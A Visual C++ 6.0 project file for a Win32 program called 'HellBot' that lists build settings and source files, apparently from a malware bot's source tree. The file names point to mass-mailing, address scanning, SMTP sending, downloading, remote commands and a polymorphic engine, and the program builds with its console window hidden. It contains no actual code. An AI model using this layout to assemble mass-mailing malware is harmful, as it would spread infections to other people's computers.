# Microsoft Developer Studio Project File - Name="HellBot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=HellBot - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "HellBot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "HellBot.mak" CFG="HellBot - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "HellBot - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /Gz /MD /w /W0 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib psapi.lib /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "HellBot - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Mail SRC"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\mail\lib.c
# End Source File
# Begin Source File

SOURCE=.\mail\massmail.c
# End Source File
# Begin Source File

SOURCE=.\mail\msg.c
# End Source File
# Begin Source File

SOURCE=.\mail\scan.c
# End Source File
# Begin Source File

SOURCE=.\mail\xdns.c
# End Source File
# Begin Source File

SOURCE=.\mail\xsmtp.c
# End Source File
# Begin Source File

SOURCE=.\mail\zipstore.c
# End Source File
# End Group
# Begin Group "Config"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Config.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Botcash.cpp
# End Source File
# Begin Source File

SOURCE=.\Commands.cpp
# End Source File
# Begin Source File

SOURCE=.\Connect.cpp
# End Source File
# Begin Source File

SOURCE=.\Crc32Static.cpp
# End Source File
# Begin Source File

SOURCE=.\CThread.cpp
# End Source File
# Begin Source File

SOURCE=.\Download.cpp
# End Source File
# Begin Source File

SOURCE=.\HellBot.cpp
# End Source File
# Begin Source File

SOURCE=.\HellMail.cpp
# End Source File
# Begin Source File

SOURCE=.\Main.cpp
# End Source File
# Begin Source File

SOURCE=.\polymorph.cpp
# End Source File
# Begin Source File

SOURCE=.\Utility.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Mail HDR"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\mail\lib.h
# End Source File
# Begin Source File

SOURCE=.\mail\massmail.h
# End Source File
# Begin Source File

SOURCE=.\mail\msg.h
# End Source File
# Begin Source File

SOURCE=.\mail\scan.h
# End Source File
# Begin Source File

SOURCE=.\mail\xdns.h
# End Source File
# Begin Source File

SOURCE=.\mail\xsmtp.h
# End Source File
# Begin Source File

SOURCE=.\mail\zipstore.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\Botcash.h
# End Source File
# Begin Source File

SOURCE=.\Commands.h
# End Source File
# Begin Source File

SOURCE=.\Connect.h
# End Source File
# Begin Source File

SOURCE=.\Crc32Static.h
# End Source File
# Begin Source File

SOURCE=.\CThread.h
# End Source File
# Begin Source File

SOURCE=.\Download.h
# End Source File
# Begin Source File

SOURCE=.\Globals.h
# End Source File
# Begin Source File

SOURCE=.\Hell.h
# End Source File
# Begin Source File

SOURCE=.\HellMail.h
# End Source File
# Begin Source File

SOURCE=.\Include.h
# End Source File
# Begin Source File

SOURCE=.\Main.h
# End Source File
# Begin Source File

SOURCE=.\polymorph.h
# End Source File
# Begin Source File

SOURCE=.\Utility.h
# End Source File
# End Group
# End Target
# End Project
